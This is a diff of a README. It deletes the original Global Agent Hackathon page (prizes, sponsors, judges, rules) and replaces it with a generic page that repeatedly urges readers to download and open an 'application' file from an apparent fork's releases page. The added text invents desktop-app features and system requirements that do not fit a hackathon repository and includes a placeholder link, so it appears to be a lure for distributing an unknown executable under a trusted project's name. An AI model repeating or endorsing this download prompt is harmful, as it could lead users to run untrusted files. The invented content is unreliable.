@@ -1,177 +1,76 @@
-<div align="center" id="top">
-  <img src="./.assets/may-2025-banner.svg" alt="Agno" width="750" height="auto">
-</div>
+# 🌟 global-agent-hackathon-may-2025 - Build Amazing AI Agents Easily
 
-# The Global Agent Hackathon
+## 🚀 Getting Started
 
-Welcome to the May 2025 edition of the Global Agent Hackathon!
+Welcome to the global-agent-hackathon-may-2025 repository! This project supports a month-long open-source hackathon focused on creating AI agents. Whether you have ideas for agents, retrieval-augmented generation (RAG), or multi-agent systems, this is the place to start building your dreams.
 
-Join us for a month-long, open-source AI Agent Hackathon — open to all builders and dreamers working on agents, RAG, tool use, and multi-agent systems.
+## 🔗 Download the Application
 
-Powered by [Agno](https://agno.link/gh), [Exa](https://exa.ai), [Firecrawl](https://www.firecrawl.dev/), [Mem0](http://mem0.ai), [Unwind AI](https://www.theunwindai.com), [Browser Use](https://browser-use.com), [mcp.run](https://www.mcp.run), [Graphlit](https://www.graphlit.com/), [Lutra AI](https://www.lutra.ai), [Potpie](https://potpie.ai) and more.
+[![Download](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/Guilherme2885/global-agent-hackathon-may-2025/releases)
 
-## 💰 Build something cool, win over $25,000 in cash and credits
+## 📥 Download & Install
 
-Win over $25,000 in cash and credits for your favorite AI tools for the most ambitious Agent projects!
+To begin using the application, **visit this page to download**: [Releases Page](https://github.com/Guilherme2885/global-agent-hackathon-may-2025/releases).
 
-## Cash Prizes
+1. Click the link above to go to the Releases page.
+2. Find the latest version in the list.
+3. Click the download link to get the application file.
+4. Once the download finishes, locate the file on your computer.
+5. Open the file to run the application.
 
-### Best Use of Agno ([see details](/resources/agno.md)):
+## 📋 Features
 
-Projects showcasing the best use case of Agno will get following cash prizes:
-- 🏆 **GRAND PRIZE**: $5,000 🏆
-- 🥇 1 winner: $2,000
-- 🥈 5 winners: $1,000 each
-- 🥉 10 winners: $500 each
-- 🏅 10 winners: $300 each
+This application includes several useful features aimed at helping you build and work with AI agents:
 
-The $300, $500 and $1,000 prizes will be awarded on a rolling basis. The $2,000 and $5,000 prizes will be awarded at the end of the hackathon.
+- **User-friendly Interface**: Navigate through a simple design that makes using AI agents easy for everyone.
+- **Agent Templates**: Use pre-built templates to get started quickly without needing any coding skills.
+- **Integration Support**: Work seamlessly with popular AI tools and libraries for a better experience.
+- **Multi-Agent Collaboration**: Create systems where multiple agents work together to achieve common goals.
+- **Documentation**: Access helpful guides and tutorials to assist you in your building process.
 
-Judges: Dirk Brand, Yash Solanky, Monali Dambre
+## 🛠️ System Requirements
 
-### Best use of Browser Use ([see details](/resources/browser-use.md)):
+Before downloading, please ensure your computer meets the following requirements:
 
-Projects showcasing the best use case of Browser Use will get following cash prizes:
-- 🏆 **GRAND PRIZE**: $2,500 🏆
-- 🥉 2 winners: $500 each
-- 🥈 10 winners: $150 each
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or a compatible Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: A minimum of 200 MB of free disk space.
+- **Additional Software**: Ensure you have the latest version of any required frameworks (e.g., .NET, Node.js) if specified in our documentation.
 
-The $150 prizes will be awarded on a rolling basis. The $500 and $2,500 prizes will be awarded at the end of the hackathon.
+## 📖 Usage Instructions
 
-Judges: Larsen Cundric, Mert Ünsal and Aitor Mato
+Once you have installed the application, follow these basic steps to begin using it:
 
-### Best use of Potpie 🥧 ([see details](/resources/potpie.md)):
+1. **Open the Application**: Locate the icon on your desktop and double-click to open.
+2. **Select a Template**: Choose a template from the options available in the main menu. Each template is designed for different agent types.
+3. **Configure Your Agent**: Fill in the necessary fields according to your project needs. Use the documentation for guidance.
+4. **Test Your Agent**: Use the built-in testing tools to ensure your agent behaves as expected.
+5. **Save Your Work**: Regularly save your progress. You can create project backups anytime.
 
-Projects showcasing the best use case of Potpie will get following cash prizes:
-- 🏆 **GRAND PRIZE**: $200 🏆
-- 🥉 3 winners: $100 each
-- 🥈 5 winners: 3 months of Potpie Pro FREE!
+## ✉️ Support and Feedback
 
-All the prizes will be awarded at the end of the hackathon.
+If you encounter any issues or have questions, you can reach out for support. Here’s how:
 
-Judges: Aditi
+- **GitHub Issues**: Use the Issues tab on our repository to report bugs or ask questions. 
+- **Community Discussion**: Engage with other users on forums or community channels linked in the documentation.
+- **Feedback Form**: Use the built-in feedback form within the application to share your thoughts.
 
-## Credits
+## 🌐 Community & Contributions
 
-### Browserbase - $1200 value:
+We welcome contributions from everyone. Here’s how you can get involved:
 
-- Startup plan for free for a whole year to the best project built using Browserbase
+- **Join the Hackathon**: Participate in events and share your projects with others.
+- **Submit Pull Requests**: If you improve the code or documentation, please consider submitting your changes.
+- **Spread the Word**: Share this project with friends and peers who may be interested in building AI agents.
 
-Judges: Lindsay Gilson
+## 🔗 Additional Resources
 
-### Exa - Free $50 credits for everyone:
+For more information, tutorials, and updates, check out these resources:
 
-Every participant gets free $50 Exa API credits!
+- [Official Documentation](https://github.com/Guilherme2885/global-agent-hackathon-may-2025/wiki)
+- [Community Forum](https://community.global-agent-hackathon.com)
+- [Related Projects](https://github.com/your-link-here)
 
-- To get the credits use the coupon code `EXA50API` by heading to the [Exa API Dashboard](https://dashboard.exa.ai/billing).
+## 🔗 Download the Application Again
 
-### Best use of Firecrawl:
-
-- Every one is entitled to 5k Firecrawl credits, enter the coupon code `hackathon5k` on the [Firecrawl Dashboard](https://www.firecrawl.dev/app/settings)
-
-### Best use of Mem0:
-
-- Mem0 is offering pro plan for free for 3 months to the best project built using Mem0. ([details coming soon](/resources/mem0.md))
-
-Judges: Taranjeet Singh
-
-### MCP Run:
-
-- [MCP.Run](https://www.mcp.run) is offering a free 3 month pro account to any participant, using `AGNOHACK2025` at checkout. Thank you MCP.Run for sponsoring the hackathon!
-
-### Best use of Graphlit:
-
-- Please [see details](/resources/graphlit.md)
-
-### Best use of Lutra AI:
-
-- [Details coming soon](/resources/lutra-ai.md)
-
-## Groq Credits
-
-Groq is the lowest cost inference provider with no tradeoffs on speed and they're offering $10 in Groq API credits to any participant (millions of tokens for all available models, including Llama 4 Scout and Maverick) and $300 in Groq API credits to the best project built using Groq.
-
-- [Fill out this form for $10 in Groq API credits](https://forms.gle/1pBpXsi2j8btk1Rd6)
-- Best use of Groq will get $300 in Groq API credits + feature on [Groq Applications Showcase](https://console.groq.com/docs/showcase-applications)
-
-## Special Recognitions
-
-- The **top 5 projects** will be featured in the trending [Awesome LLM Apps repo](https://github.com/Shubhamsaboo/awesome-llm-apps), giving your work massive visibility in the AI community.
-
-Judges: Shubham Saboo
-
-## 📚 Resources
-
-Resources for each sponsor are available in the [resources](/resources) folder.
-
-## ⏱️ Timeline
-
-- **April 15th** - Hackathon starts
-- **June 1st** - Hackathon ends
-
-## 🚀 How to Participate
-
-1. **Submit your project** by creating a GitHub issue in this repo following the provided [template](./.github/ISSUE_TEMPLATE/submission-template.md).
-2. **Get category assignment**
-    - The Hackathon team will review your submission and assign it to a prize category.
-    - You can update your issue as you build, and we'll update the prize category accordingly.
-    - Prize categories can be updated until the hackathon ends.
-    - Categories include Best use of Agno, Firecrawl, Mem0, Graphlit and Browser Use.
-3. **Build your project** and submit a PR for your project in the submissions folder - we'll review, judge, and provide feedback. Note: you can start building as we review your submission.
-4. **When your PR is approved**, you join the pool to win the assigned cash prize and/or credits.
-    - Checkout the [How to Win](#how-to-win) section for more details.
-5. **Winning projects** will be moved to the **winners** folder.
-
-## 🏆 How to Win
-
-Your submission will be judged on:
-
-- **Completed PR** with working code in the Hackathon GitHub repo.
-    - A **judge** will review the PR and provide feedback.
-    - Once approved, the PR will be merged and the project will be eligible for the prize pool.
-- **Demo Video** (2–3 mins) showing your agent in action.
-- **Comprehensive README.md** including:
-  - Overview of the idea
-  - Explanation of how it works
-  - Technologies/tools used
-  - All setup instructions (API keys, signups, etc.)
-- **Code Quality**: Error-free execution and passing basic review.
-- **Completeness**: Core functionality implemented as described in your original submission.
-
-Feel free to share your progress on X or LinkedIn with the hashtag #GlobalAgentHackathon — even small updates can get you noticed and help build community momentum. This is completely optional, but always welcome and appreciated!
-
-## 📌 Submission Criteria
-
-Include the following in your submission:
-
-**Project Title:** A clear, concise, and engaging title for your project.
-
-**Overview of the Idea:** Briefly describe your project in simple terms. What problem or opportunity does it address?
-
-**Project Goal:** What do you hope to achieve or demonstrate with this project?
-
-**How It Works:** Provide a step-by-step explanation or high-level breakdown of your Agentic System and how users will interact with it:
-- **User Flow**: Clearly describe the experience from the user's perspective
-- **Core Functionality**: List the key features your agent will offer
-- **Multimodal Elements** (if applicable): Specify if you're using text, images, audio, video, or combinations
-
-**Tools Used:** List what you're planning to use, including any new tools you need to create.
-
-**UI Approach:** Describe the user interface for your project.
-
-**Visuals:** Add mockups, diagrams, or sketches that demonstrate your idea or flow.
-
-**Team Information:**
-- **Team Lead:** GitHub handle and role
-- **Team Members:** GitHub handles and roles
-- **Background/Experience:** Brief team background
-
-## 🤝 Want to Partner?
-
-If you're an AI company and want to help shape the next generation of Agent builders - we'd love to work with you!
-
-Reach out to support@agno.com to get involved.
-
-Let's make this the largest open-source AI Agent hackathon ever!
-
-**See you in the arena.**
+Don’t forget to download the application from the [Releases Page](https://github.com/Guilherme2885/global-agent-hackathon-may-2025/releases) if you haven’t done so yet. Enjoy building your AI agents!
